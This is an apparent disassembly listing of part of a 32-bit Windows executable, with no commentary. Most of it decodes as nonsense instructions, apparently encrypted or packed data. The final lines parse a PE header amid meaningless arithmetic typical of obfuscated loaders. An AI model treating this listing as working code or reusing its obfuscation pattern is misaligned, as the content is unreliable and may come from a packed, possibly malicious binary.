  4236b5:	mov    DWORD PTR [edi],0xbd98260b
  4236bb:	jecxz  0x423667
  4236bd:	leave  
  4236be:	cmc    
  4236bf:	inc    esp
  4236c0:	test   al,0x6e
  4236c2:	pop    esi
  4236c3:	daa    
  4236c4:	sub    DWORD PTR [ecx-0xf9cc7d2],esi
  4236ca:	inc    ebx
  4236cb:	sbb    bl,cl
  4236cd:	inc    ebp
  4236ce:	push   ds
  4236cf:	xchg   ebx,eax
  4236d0:	aam    0x16
  4236d2:	sub    edi,eax
  4236d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236d5:	fiadd  DWORD PTR [eax+ecx*8-0x73510b0b]
  4236dc:	dec    edi
  4236dd:	mov    eax,DWORD PTR [eax+0x70e07075]
  4236e3:	dec    eax
  4236e4:	add    al,bh
  4236e6:	or     al,0x41
  4236e8:	push   ebp
  4236e9:	adc    bh,cl
  4236eb:	into   
  4236ec:	loop   0x423766
  4236ee:	jns    0x4236d8
  4236f0:	inc    esi
  4236f1:	sub    bl,ah
  4236f3:	xchg   edx,eax
  4236f4:	mov    DWORD PTR [esp+eax*8],ebp
  4236f7:	pushf  
  4236f8:	inc    ecx
  4236f9:	bound  ecx,QWORD PTR [eax+0x114f8939]
  4236ff:	push   esp
  423700:	mov    dl,ah
  423702:	sub    BYTE PTR ds:0x29c8587,dl
  423708:	mov    BYTE PTR [esi+0x6d],ch
  42370b:	clc    
  42370c:	out    dx,eax
  42370d:	or     BYTE PTR [esi],dh
  42370f:	cmp    al,0x61
  423711:	and    DWORD PTR [ecx+0x32ad2fdd],ebp
  423717:	lock mov ds:0x2f0f6763,eax
  42371d:	test   eax,0x6a311c72
  423722:	inc    ebp
  423723:	jmp    0x41ec:0x2c0b91ec
  42372a:	mov    ds:0x6b355756,eax
  42372f:	sub    BYTE PTR [ebx-0x63],0xc9
  423733:	hlt    
  423734:	adc    eax,0x45d00f91
  423739:	mov    edx,0x7f2688db
  42373e:	in     eax,0xdf
  423740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423741:	dec    esp
  423742:	cmp    al,0x40
  423744:	mov    WORD PTR [edi-0x4a36869f],?
  42374a:	shl    eax,1
  42374c:	dec    edx
  42374d:	dec    ebp
  42374e:	sahf   
  42374f:	and    edi,esi
  423751:	(bad)  
  423752:	in     eax,dx
  423753:	je     0x4236f3
  423755:	ret    
  423756:	not    BYTE PTR [ebp-0x317c915]
  42375c:	push   ecx
  42375d:	push   esp
  42375e:	lahf   
  42375f:	outs   dx,DWORD PTR ds:[esi]
  423760:	out    dx,eax
  423761:	out    0x7a,eax
  423763:	jp     0x423755
  423765:	fisub  WORD PTR [edi+0x67]
  423768:	mov    ebx,DWORD PTR [edi+edx*4]
  42376b:	ins    BYTE PTR es:[edi],dx
  42376c:	lods   al,BYTE PTR ds:[esi]
  42376d:	pop    ebp
  42376e:	xor    BYTE PTR [ebp-0x5a],cl
  423771:	stc    
  423772:	je     0x4236f9
  423774:	push   ss
  423775:	outs   dx,BYTE PTR ds:[esi]
  423776:	adc    ecx,edx
  423778:	dec    edx
  423779:	or     edx,DWORD PTR [ebp+0x37]
  42377c:	pushf  
  42377d:	fidiv  WORD PTR [edi+esi*4]
  423780:	out    0x69,eax
  423782:	sbb    eax,0x3e28f149
  423787:	(bad)  
  423788:	cs repnz push 0x4f5e4d51
  42378f:	sbb    BYTE PTR ds:0xdd05ecfc,ch
  423795:	xchg   edx,eax
  423796:	popf   
  423797:	xor    BYTE PTR [ebp+esi*1-0x7d],0x6b
  42379c:	xor    al,0x52
  42379e:	mov    al,0x1d
  4237a0:	xchg   BYTE PTR [ebx+0x7c],cl
  4237a3:	jle    0x4237d0
  4237a5:	pop    es
  4237a6:	dec    eax
  4237a7:	sbb    al,0xfd
  4237a9:	or     BYTE PTR [edx+0x61],0x93
  4237ad:	retf   0x38cf
  4237b0:	sbb    al,0x6b
  4237b2:	lods   eax,DWORD PTR ds:[esi]
  4237b3:	push   0xffffffb0
  4237b5:	inc    edx
  4237b6:	stos   BYTE PTR es:[edi],al
  4237b7:	sbb    ch,bh
  4237b9:	or     al,0x16
  4237bb:	or     dh,BYTE PTR [ecx]
  4237bd:	shr    BYTE PTR [edi-0x5aee26c3],0xc8
  4237c4:	ja     0x42377f
  4237c6:	stc    
  4237c7:	jne    0x4237f8
  4237c9:	xchg   esp,eax
  4237ca:	gs xchg esp,eax
  4237cc:	shl    eax,1
  4237ce:	inc    ebp
  4237cf:	retf   
  4237d0:	jo     0x4237e4
  4237d2:	mov    DWORD PTR [ecx+0x3f],esi
  4237d5:	addr16 in al,0x14
  4237d8:	in     al,0x4a
  4237da:	dec    edi
  4237db:	into   
  4237dc:	jmp    0x423788
  4237de:	mov    ds:0xf903677e,al
  4237e3:	imul   esi,DWORD PTR [esi],0x1
  4237e6:	jge    0x4d9a963d
  4237ec:	push   ecx
  4237ed:	loope  0x42378c
  4237ef:	(bad)  
  4237f0:	je     0x423796
  4237f2:	jns    0x42377c
  4237f4:	jmp    0xd6a4a9f8
  4237f9:	or     DWORD PTR [edi-0xe],eax
  4237fc:	dec    esi
  4237fd:	sti    
  4237fe:	outs   dx,DWORD PTR ds:[esi]
  4237ff:	out    dx,al
  423800:	ja     0x423823
  423802:	and    esi,ebp
  423804:	and    ch,BYTE PTR [ecx]
  423806:	je     0x423867
  423808:	xor    DWORD PTR [eax],ecx
  42380a:	pop    ebx
  42380b:	fwait
  42380c:	rol    esi,1
  42380e:	xor    eax,0xbec8ead8
  423813:	loop   0x4237f7
  423815:	xor    bl,BYTE PTR ds:0xa2a2c22f
  42381b:	leave  
  42381c:	arpl   dx,di
  42381e:	jl     0x423849
  423820:	(bad)
  423824:	push   ebx
  423825:	retf   
  423826:	mov    esi,0x4373a3c3
  42382b:	imul   ebp,DWORD PTR [ecx],0x30594ff8
  423831:	dec    ebx
  423832:	aas    
  423833:	lods   eax,DWORD PTR ds:[esi]
  423834:	clc    
  423835:	(bad)  
  423836:	int    0xba
  423838:	call   0x8c9a:0x4139e7ad
  42383f:	mov    ebp,DWORD PTR [edx]
  423841:	mov    cl,0x69
  423843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423844:	icebp  
  423845:	in     eax,dx
  423846:	sbb    edx,DWORD PTR ds:0x6b64ab5c
  42384c:	cmp    al,0xd
  42384e:	(bad)  
  42384f:	in     eax,0xd4
  423851:	daa    
  423852:	mov    ds:0x4e7db57c,eax
  423857:	ins    BYTE PTR es:[edi],dx
  423858:	js     0x423817
  42385a:	inc    esp
  42385b:	sbb    DWORD PTR [edi],edx
  42385d:	(bad)  
  42385e:	loop   0x423866
  423860:	mov    ah,0x1c
  423862:	cmp    al,0xd9
  423864:	cmp    ebp,DWORD PTR [eax-0x52]
  423867:	fs in  al,dx
  423869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42386a:	jnp    0x4238d0
  42386c:	bound  esp,QWORD PTR [edi+0x40]
  42386f:	pop    eax
  423870:	mov    ss:0x7a9a83d,eax
  423876:	das    
  423877:	cmp    esp,DWORD PTR [edx+0x579c12c7]
  42387d:	inc    eax
  42387e:	bound  edi,QWORD PTR ds:0xb5a94fdb
  423884:	call   0xed2d4630
  423889:	and    al,0xf7
  42388b:	test   dl,ah
  42388d:	push   cs
  42388e:	adc    BYTE PTR [ebx],al
  423890:	add    BYTE PTR [esi+0x3],dl
  423893:	fucom  st(7)
  423895:	lods   al,BYTE PTR ds:[esi]
  423896:	cmp    eax,0x752aa811
  42389b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42389c:	cmp    ah,bh
  42389e:	adc    eax,0x22b4906c
  4238a3:	push   ecx
  4238a4:	pop    ebp
  4238a5:	mov    ds:0x99500780,eax
  4238aa:	setp   BYTE PTR [eax-0x3cfc8a46]
  4238b1:	pushf  
  4238b2:	enter  0xb13b,0x68
  4238b6:	pop    eax
  4238b7:	aad    0x15
  4238b9:	xchg   edi,eax
  4238ba:	aas    
  4238bb:	mov    ebp,0x813a4675
  4238c0:	(bad)  
  4238c1:	push   0x22ceb499
  4238c6:	fidiv  DWORD PTR [ebp+0x29bde51c]
  4238cc:	fs xor al,0x10
  4238cf:	div    BYTE PTR [edi+edi*1]
  4238d2:	out    0x1e,eax
  4238d4:	jo     0x42386f
  4238d6:	xchg   edx,eax
  4238d7:	scas   eax,DWORD PTR es:[edi]
  4238d8:	fmul   DWORD PTR [ebp+0x509c2076]
  4238de:	test   al,0xcc
  4238e0:	fldenv [ebx]
  4238e2:	imul   ebp,DWORD PTR [edi],0x4a
  4238e5:	mov    ch,0x19
  4238e7:	cli    
  4238e8:	out    dx,al
  4238e9:	clc    
  4238ea:	test   DWORD PTR [eax-0x26],ebx
  4238ed:	cmp    esi,DWORD PTR [esi+eax*2]
  4238f0:	jne    0x423939
  4238f2:	scas   eax,DWORD PTR es:[edi]
  4238f3:	shr    BYTE PTR [ebp+ebx*2+0x32],1
  4238f7:	sbb    DWORD PTR [ecx],ecx
  4238f9:	out    dx,eax
  4238fa:	int3   
  4238fb:	(bad)  
  4238fc:	scas   al,BYTE PTR es:[edi]
  4238fd:	jnp    0x4238c4
  4238ff:	imul   ebp,DWORD PTR [ebx+edi*2+0x2],0x919d3a61
  423907:	mov    cl,0xea
  423909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42390a:	leave  
  42390b:	sub    BYTE PTR [esi-0x786e3d06],dh
  423911:	fwait
  423912:	adc    esp,DWORD PTR [bx+di-0x1e45]
  423917:	cwde   
  423918:	shl    DWORD PTR [ebp-0x74280466],cl
  42391e:	call   0x7972:0xd1859748
  423925:	sbb    al,ch
  423927:	mul    DWORD PTR [edi-0x68]
  42392a:	pop    ebp
  42392b:	(bad)  
  42392c:	rol    BYTE PTR [edi+0x5d333707],cl
  423932:	lock shl DWORD PTR [edx+edx*2],cl
  423936:	mov    esi,0xf7ed90f2
  42393b:	or     al,0x83
  42393d:	(bad)  
  42393e:	jle    0x423924
  423940:	and    BYTE PTR fs:[edx],0x12
  423944:	mov    esp,0x252eea3a
  423949:	sbb    eax,0x4431d482
  42394e:	imul   esp
  423950:	and    bh,BYTE PTR [ebx]
  423952:	adc    ebx,ebx
  423954:	sbb    BYTE PTR ds:0x3d217133,ch
  42395a:	aas    
  42395b:	je     0x423925
  42395d:	mov    ebx,0x35f46315
  423962:	pusha  
  423963:	xor    BYTE PTR [edi],0x6d
  423966:	ret    
  423967:	das    
  423968:	adc    BYTE PTR ds:0x57247df,ah
  42396e:	jp     0x42390f
  423970:	scas   al,BYTE PTR es:[edi]
  423971:	mov    edi,0xeecb4d22
  423976:	xor    al,0x2d
  423978:	xor    eax,DWORD PTR [ebp+0x7f]
  42397b:	push   edx
  42397c:	mov    BYTE PTR [ebx-0x7b],bh
  42397f:	xchg   ebx,eax
  423980:	xchg   edi,eax
  423981:	dec    eax
  423982:	sbb    BYTE PTR ds:0x3244251c,dl
  423988:	sbb    eax,0xd3912c38
  42398d:	jne    0x4239e3
  42398f:	cdq    
  423990:	sub    ah,BYTE PTR [edi-0x6d]
  423993:	jg     0x4239f4
  423995:	inc    edi
  423996:	push   edx
  423997:	cli    
  423998:	ds jbe 0x4239a4
  42399b:	test   al,0xba
  42399d:	push   esp
  42399e:	jbe    0x4239c2
  4239a0:	cmp    ebx,edx
  4239a2:	push   edi
  4239a3:	dec    esi
  4239a4:	fsubr  st(7),st
  4239a6:	inc    esp
  4239a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239a8:	jge    0x4239fa
  4239aa:	aas    
  4239ab:	loope  0x42392f
  4239ad:	retf   
  4239ae:	mov    esi,0x7eb313fa
  4239b3:	mov    ds:0xfa464a63,al
  4239b8:	lea    ebp,[ecx+0x6d4880b9]
  4239be:	lods   al,BYTE PTR ds:[esi]
  4239bf:	stos   DWORD PTR es:[edi],eax
  4239c0:	dec    eax
  4239c2:	jge    0x4239b1
  4239c4:	(bad)  
  4239c5:	mov    ebx,0x6d1f7028
  4239ca:	xor    al,0xa1
  4239cc:	out    dx,al
  4239cd:	or     ecx,DWORD PTR [edi-0x14]
  4239d0:	popa   
  4239d1:	mov    ch,0xc5
  4239d3:	scas   al,BYTE PTR es:[edi]
  4239d4:	mov    esi,0x92207b97
  4239d9:	cli    
  4239da:	lds    eax,FWORD PTR [esi-0x2]
  4239dd:	push   edx
  4239de:	(bad)  
  4239df:	cld    
  4239e0:	mov    DWORD PTR [ecx+ebp*1+0x796a130d],edx
  4239e7:	mov    bl,ah
  4239e9:	rcr    BYTE PTR [ebx],0x2f
  4239ec:	(bad)  
  4239ed:	jmp    0x423a43
  4239ef:	sub    ah,dh
  4239f1:	hlt    
  4239f2:	dec    edi
  4239f3:	xchg   ebx,eax
  4239f4:	jo     0x423a3e
  4239f6:	mov    esi,DWORD PTR ds:0x251b9ad1
  4239fc:	push   ds
  4239fd:	rcr    BYTE PTR [ebp+0x76f29ddb],1
  423a03:	push   edx
  423a04:	mov    ebx,0xb69c31cd
  423a09:	mov    al,ds:0x1d71f268
  423a0e:	adc    ch,BYTE PTR [esi-0x5ab09813]
  423a14:	sub    ebp,edi
  423a16:	xchg   edx,eax
  423a17:	gs gs dec ebx
  423a1a:	push   0xfffffff8
  423a1c:	inc    esp
  423a1d:	out    dx,eax
  423a1e:	push   edx
  423a1f:	mov    gs,WORD PTR gs:[esi-0x1e60c32a]
  423a26:	sub    al,0x85
  423a28:	mov    ebp,DWORD PTR [esi]
  423a2a:	dec    BYTE PTR [ecx+0x7a]
  423a2d:	add    al,0x20
  423a2f:	popf   
  423a30:	push   ecx
  423a31:	bound  ebp,QWORD PTR [esi+0x25]
  423a34:	sahf   
  423a35:	mov    dh,0xb4
  423a37:	jns    0x423a23
  423a39:	cmp    DWORD PTR [ebx],ebp
  423a3b:	xor    edx,ebx
  423a3d:	or     DWORD PTR [ebx],esp
  423a3f:	nop
  423a40:	xchg   ecx,eax
  423a41:	in     eax,dx
  423a42:	(bad)  
  423a43:	and    dh,BYTE PTR [edi+0x1a]
  423a46:	mov    ah,0x49
  423a48:	sahf   
  423a49:	jb     0x423a12
  423a4b:	sbb    ebx,DWORD PTR ds:0x6350fd8
  423a51:	sub    ah,BYTE PTR [ecx-0x3eb74632]
  423a57:	fidivr WORD PTR [eax]
  423a59:	and    eax,0x9b227e2e
  423a5e:	enter  0xa74a,0x77
  423a62:	adc    dh,al
  423a64:	shl    dh,cl
  423a66:	mov    ds:0x6a0b3ecd,al
  423a6b:	push   0x16
  423a6d:	cmp    DWORD PTR gs:[ecx+eiz*8],ecx
  423a71:	mov    al,0x63
  423a73:	gs js  0x423a72
  423a76:	sbb    ah,BYTE PTR [ebx-0x68]
  423a79:	in     eax,0x34
  423a7b:	into   
  423a7c:	add    eax,0x4299d945
  423a81:	mov    edx,0xc1363ac4
  423a86:	add    cl,cl
  423a88:	dec    ebp
  423a89:	inc    ecx
  423a8a:	dec    esp
  423a8b:	mov    dh,0x9d
  423a8d:	enter  0x4922,0xcf
  423a91:	jmp    0x60ad103
  423a96:	jae    0x423a84
  423a98:	jns    0x423a2d
  423a9a:	jge    0x423ad2
  423a9c:	xor    DWORD PTR [ebx],0xc
  423a9f:	scas   eax,DWORD PTR es:[edi]
  423aa0:	jo     0x423afd
  423aa2:	cmp    ah,0x8c
  423aa5:	jb     0x423aee
  423aa7:	pop    edx
  423aa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423aa9:	cmp    BYTE PTR [esi],0xbf
  423aac:	sub    BYTE PTR [ebp+0x46],0xbd
  423ab0:	push   es
  423ab1:	mov    al,0x2c
  423ab3:	xchg   DWORD PTR [eax+0x4c556c2e],edi
  423ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423aba:	push   ebp
  423abb:	cdq    
  423abc:	jb     0x423aff
  423abe:	xchg   ecx,eax
  423abf:	dec    ecx
  423ac0:	or     eax,0xa8a90ea3
  423ac5:	xor    eax,0x6d24f8de
  423aca:	test   eax,0x6335c160
  423acf:	pop    ebp
  423ad0:	pop    eax
  423ad1:	in     eax,dx
  423ad2:	mov    ebx,0x3d5d66bb
  423ad7:	mov    dl,0x2b
  423ad9:	xor    BYTE PTR [edx+eax*4-0x43],0x62
  423ade:	popf   
  423adf:	cdq    
  423ae0:	js     0x423ace
  423ae2:	dec    edi
  423ae3:	sbb    BYTE PTR [edx+eax*8+0x5a7ed6e8],cl
  423aea:	(bad)  
  423aeb:	neg    BYTE PTR [ebp+0xdfa9294]
  423af1:	jl     0x423ad9
  423af3:	or     al,0x89
  423af5:	inc    ebx
  423af6:	jb     0x423a9e
  423af8:	ja     0x423add
  423afa:	(bad)  
  423afb:	mov    esp,0xbae2ee8a
  423b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b01:	out    0xb6,al
  423b03:	mov    ebx,DWORD PTR [esi]
  423b05:	mov    esi,0x45445a99
  423b0a:	sbb    eax,0x513fd282
  423b0f:	jmp    0xd871c0a7
  423b14:	jg     0x423b23
  423b16:	xor    BYTE PTR [eax-0x7940227b],bh
  423b1c:	out    dx,al
  423b1d:	xchg   DWORD PTR [edi],esi
  423b1f:	xchg   ebx,eax
  423b20:	and    DWORD PTR [ebp+0x2d],0xffffffbb
  423b24:	mov    DWORD PTR [eax+ebp*1],ebp
  423b27:	inc    ebp
  423b28:	test   BYTE PTR [ebx],cl
  423b2a:	cmc    
  423b2b:	test   al,0x5c
  423b2d:	push   edx
  423b2e:	lds    ecx,FWORD PTR [edx+0x21b07615]
  423b34:	in     eax,dx
  423b35:	hlt    
  423b36:	mov    cl,0x40
  423b38:	mov    cl,0xe4
  423b3a:	dec    eax
  423b3b:	xchg   ecx,eax
  423b3c:	inc    edx
  423b3d:	arpl   bp,sp
  423b3f:	aas    
  423b40:	imul   edi
  423b42:	inc    edx
  423b43:	sub    eax,0xd5febc3c
  423b48:	pop    ebx
  423b49:	pushf  
  423b4a:	mov    eax,ds:0xd0fc9869
  423b4f:	mov    edi,DWORD PTR [ebx-0x6dd066e3]
  423b55:	les    esi,FWORD PTR [ecx+eax*2+0xba6ff89]
  423b5c:	sbb    eax,ebx
  423b5e:	xor    edx,DWORD PTR [edx]
  423b60:	(bad)  
  423b61:	xor    al,0xb7
  423b63:	add    BYTE PTR [edi+esi*1+0x3d],dl
  423b67:	cmp    eax,0x15ed6064
  423b6c:	iret   
  423b6d:	or     BYTE PTR [edx-0x6d],cl
  423b70:	add    DWORD PTR [eax+0x12],edi
  423b73:	fisttp DWORD PTR [esi+0x437e52bd]
  423b79:	pushf  
  423b7a:	jecxz  0x423be1
  423b7c:	retf   
  423b7d:	cmp    BYTE PTR [ecx],cl
  423b7f:	retf   
  423b80:	shl    BYTE PTR [ecx],0xcc
  423b83:	xor    eax,0xf22ef526
  423b88:	lods   eax,DWORD PTR ds:[esi]
  423b89:	call   0x73da:0x517a31a5
  423b90:	sub    al,0xb7
  423b92:	inc    ebp
  423b93:	fiadd  WORD PTR [ecx-0x7c4367f]
  423b99:	cmp    al,0x7e
  423b9b:	or     cl,BYTE PTR [ebp-0x7c]
  423b9e:	outs   dx,DWORD PTR ds:[esi]
  423b9f:	push   es
  423ba0:	push   cs
  423ba1:	cmp    eax,0x2892297b
  423ba6:	dec    ecx
  423ba7:	cmp    dl,BYTE PTR ds:0x88532c5a
  423bad:	vunpckhps ymm1,ymm7,YMMWORD PTR [eax]
  423bb1:	ficomp DWORD PTR [edx]
  423bb3:	dec    edx
  423bb4:	pop    esi
  423bb5:	xchg   esi,eax
  423bb6:	mov    edi,0x309c0853
  423bbb:	scas   al,BYTE PTR es:[edi]
  423bbc:	inc    eax
  423bbd:	jnp    0x423c39
  423bbf:	adc    esp,ebx
  423bc1:	jbe    0x423baa
  423bc3:	lock add eax,DWORD PTR [edi-0x27117bb8]
  423bca:	jge    0x423c32
  423bcc:	out    dx,eax
  423bcd:	les    ebp,FWORD PTR cs:[edi]
  423bd0:	pop    edi
  423bd1:	adc    eax,0x4315edd
  423bd6:	out    0xb7,al
  423bd8:	push   eax
  423bd9:	dec    esi
  423bda:	in     al,dx
  423bdb:	fidiv  WORD PTR [edx+edi*1+0x11a6e5e1]
  423be2:	stos   BYTE PTR es:[edi],al
  423be3:	jb     0x423c46
  423be5:	nop
  423be6:	dec    ecx
  423be7:	fs push ss
  423be9:	mov    dh,0x35
  423beb:	add    eax,0x7a6646a9
  423bf0:	loop   0x423c13
  423bf2:	inc    ebx
  423bf3:	mov    ebx,0x5a9eb4df
  423bf8:	inc    esp
  423bf9:	jns    0x423c26
  423bfb:	mov    edx,DWORD PTR [edi]
  423bfd:	pop    es
  423bfe:	dec    esi
  423bff:	mov    cl,0x3b
  423c01:	pushf  
  423c02:	pop    es
  423c03:	dec    esi
  423c04:	dec    esp
  423c05:	jle    0x423c2b
  423c07:	shl    DWORD PTR [edi],1
  423c09:	jmp    0xd3a3:0xf8018ad
  423c10:	call   0x73dbed46
  423c15:	sahf   
  423c16:	(bad)  
  423c17:	js     0x423c93
  423c19:	test   al,0x54
  423c1b:	xchg   DWORD PTR [eax+0x7c],ebx
  423c1e:	xlat   BYTE PTR ds:[ebx]
  423c1f:	mov    cs,edx
  423c21:	pop    ds
  423c22:	in     eax,dx
  423c23:	push   ss
  423c24:	jmp    0xf9b6:0x55a253a6
  423c2b:	nop
  423c2c:	loopne 0x423c83
  423c2e:	adc    DWORD PTR [esi+0x4dc16cbb],ebp
  423c34:	or     cl,BYTE PTR [ecx+0x6f]
  423c37:	inc    ebx
  423c38:	lahf   
  423c39:	jns    0x423bce
  423c3b:	test   eax,0xcd56c3bc
  423c40:	mov    BYTE PTR [edi-0x6331cc96],ah
  423c46:	cmp    dh,dl
  423c48:	mov    al,0xe9
  423c4a:	mov    esp,DWORD PTR [ecx]
  423c4c:	aam    0x6f
  423c4e:	mov    WORD PTR [edi-0x5f],?
  423c51:	fcom   QWORD PTR [eax-0x32]
  423c54:	ss std 
  423c56:	sbb    bl,ah
  423c58:	jmp    0x423cd9
  423c5a:	xchg   ebp,eax
  423c5b:	ins    BYTE PTR es:[edi],dx
  423c5c:	mov    ecx,0x80863cee
  423c61:	sar    esi,cl
  423c63:	retf   
  423c64:	inc    esi
  423c65:	cmp    al,0x3f
  423c67:	iret   
  423c68:	mov    BYTE PTR [edx-0x3],bh
  423c6b:	pop    esp
  423c6c:	fld    QWORD PTR [eax-0x28]
  423c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c70:	shl    DWORD PTR [edi],1
  423c72:	mov    ebp,0xe19cdd2c
  423c77:	mov    ds:0x700745ae,eax
  423c7c:	mov    dh,0x37
  423c7e:	push   eax
  423c7f:	add    BYTE PTR [eax+0x3f78dfaf],ah
  423c85:	mov    al,BYTE PTR [ebx+0x3f]
  423c88:	stos   DWORD PTR es:[edi],eax
  423c89:	aam    0xb9
  423c8b:	lods   eax,DWORD PTR ds:[esi]
  423c8c:	call   0x3b5e7b9e
  423c91:	mov    dh,0xef
  423c93:	push   ss
  423c94:	ja     0x423d0a
  423c96:	sub    BYTE PTR [edx-0x27],bl
  423c99:	sahf   
  423c9a:	xor    al,0x9
  423c9c:	jge    0x423ca4
  423c9e:	xchg   edi,eax
  423c9f:	dec    esi
  423ca0:	fwait
  423ca1:	in     al,dx
  423ca2:	mov    dh,0x98
  423ca4:	xor    al,0x9
  423ca6:	mov    esi,0xac63c770
  423cab:	(bad)  
  423cac:	pop    eax
  423cad:	sti    
  423cae:	imul   ebp,esi,0x251e6e67
  423cb4:	xchg   esi,eax
  423cb5:	nop
  423cb6:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  423cb8:	inc    ebp
  423cb9:	or     BYTE PTR [edx-0x7d6ef066],dl
  423cbf:	adc    edx,DWORD PTR [edx-0x66531593]
  423cc5:	imul   ecx,DWORD PTR [esi+0x77],0x63178dc4
  423ccc:	fst    QWORD PTR [edx-0x7742ac8e]
  423cd2:	and    BYTE PTR cs:[edi],0xf0
  423cd6:	sahf   
  423cd7:	shl    cl,cl
  423cd9:	jb     0x423c79
  423cdb:	cmp    DWORD PTR [edx+esi*2-0x6b],ecx
  423cdf:	mov    edx,0x193292f7
  423ce4:	mov    es,edx
  423ce6:	or     bl,BYTE PTR [ebp-0x29]
  423ce9:	repnz push ebx
  423ceb:	push   0xffffffec
  423ced:	ss shl esp,0x68
  423cf1:	rcl    DWORD PTR [eax+0xec5ca7c],1
  423cf7:	aas    
  423cf8:	mov    al,ds:0x9d9921d
  423cfd:	call   0x2ad7d85d
  423d02:	sub    ah,ah
  423d04:	jmp    0x423cdc
  423d06:	or     al,0x7d
  423d08:	or     al,0x65
  423d0a:	sbb    eax,0x2d786590
  423d0f:	pop    ebx
  423d10:	mov    ds:0xb1d21daf,eax
  423d15:	inc    ecx
  423d16:	enter  0x90d2,0x8f
  423d1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d1b:	scas   eax,DWORD PTR es:[edi]
  423d1c:	sbb    DWORD PTR [eax-0x7a],edi
  423d1f:	test   eax,0x4accb296
  423d24:	jmp    0x34fe:0xe4cce16d
  423d2b:	sub    DWORD PTR [eax+edx*1-0x4a2d3eec],ebx
  423d32:	add    DWORD PTR [ebx+0x62],ecx
  423d35:	inc    esp
  423d36:	aas    
  423d37:	push   edx
  423d38:	mov    dh,0x86
  423d3a:	icebp  
  423d3b:	inc    esp
  423d3c:	sub    DWORD PTR [ebx],esp
  423d3e:	mov    cl,0x71
  423d40:	mov    bh,0x69
  423d42:	es jp  0x423dae
  423d45:	iret   
  423d46:	lds    edx,FWORD PTR [eax]
  423d48:	das    
  423d49:	xchg   ebx,eax
  423d4a:	adc    eax,DWORD PTR [edx]
  423d4c:	or     BYTE PTR es:[ebp+0x6ff61297],ah
  423d53:	mov    ?,WORD PTR [ebp+0xf505a1d]
  423d59:	repnz loopne 0x423d90
  423d5c:	xchg   ebp,eax
  423d5d:	ss loope 0x423db4
  423d60:	fcom   DWORD PTR [ebx-0x7c]
  423d63:	lahf   
  423d64:	or     dh,BYTE PTR [ebp-0x8dd8e4f]
  423d6a:	gs inc esi
  423d6c:	cli    
  423d6d:	popf   
  423d6e:	popa   
  423d6f:	addr16 push edx
  423d71:	psrlw  mm4,QWORD PTR [edi-0x154f2a0d]
  423d78:	mov    edi,0x3ffa187d
  423d7d:	add    edi,DWORD PTR [esi-0x73]
  423d80:	push   ds
  423d81:	test   ch,bh
  423d83:	test   BYTE PTR [esi+0x1e140619],bl
  423d89:	jle    0x423d89
  423d8b:	lds    ebp,FWORD PTR [edx]
  423d8d:	jmp    0x66c85b9d
  423d92:	or     BYTE PTR [ebp-0x26],bl
  423d95:	loop   0x423d79
  423d97:	and    bl,ch
  423d99:	rcl    edi,cl
  423d9b:	inc    eax
  423d9c:	push   ebx
  423d9d:	mov    ah,0x1a
  423d9f:	aam    0xe2
  423da1:	nop
  423da2:	or     cl,BYTE PTR [ecx+0x652dbe3e]
  423da8:	mov    ah,0xea
  423daa:	stos   BYTE PTR es:[edi],al
  423dab:	mov    al,0xd6
  423dad:	pusha  
  423dae:	push   ebp
  423daf:	push   ss
  423db0:	in     al,0x68
  423db2:	cld    
  423db3:	xchg   ecx,eax
  423db4:	push   cs
  423db5:	fwait
  423db6:	pop    eax
  423db7:	add    eax,0x27fcd3e8
  423dbc:	xchg   ebp,eax
  423dbd:	call   0x584e:0x41dc457c
  423dc4:	loope  0x423da2
  423dc6:	or     ch,bh
  423dc8:	inc    eax
  423dc9:	test   bl,al
  423dcb:	pop    esi
  423dcc:	retf   
  423dcd:	mov    ecx,ebx
  423dcf:	push   ebx
  423dd0:	stos   DWORD PTR es:[edi],eax
  423dd1:	mov    edx,0xfd315321
  423dd6:	ror    BYTE PTR [ebx+0x175d012c],0x70
  423ddd:	test   eax,0x81c97579
  423de2:	cmp    ebx,DWORD PTR [esi-0x210f9e82]
  423de8:	out    0x52,eax
  423dea:	icebp  
  423deb:	ret    
  423dec:	dec    ebp
  423ded:	(bad)  
  423def:	inc    edx
  423df0:	enter  0x5833,0x18
  423df4:	push   ebx
  423df5:	fisubr DWORD PTR [edx+0x4b]
  423df8:	loop   0x423e58
  423dfa:	cli    
  423dfb:	and    eax,0xae224ab0
  423e00:	add    edx,DWORD PTR [ebp-0x75]
  423e03:	inc    ebp
  423e04:	or     BYTE PTR [edi],cl
  423e06:	mov    esi,0x72f6ba00
  423e0b:	xor    al,BYTE PTR [eax]
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
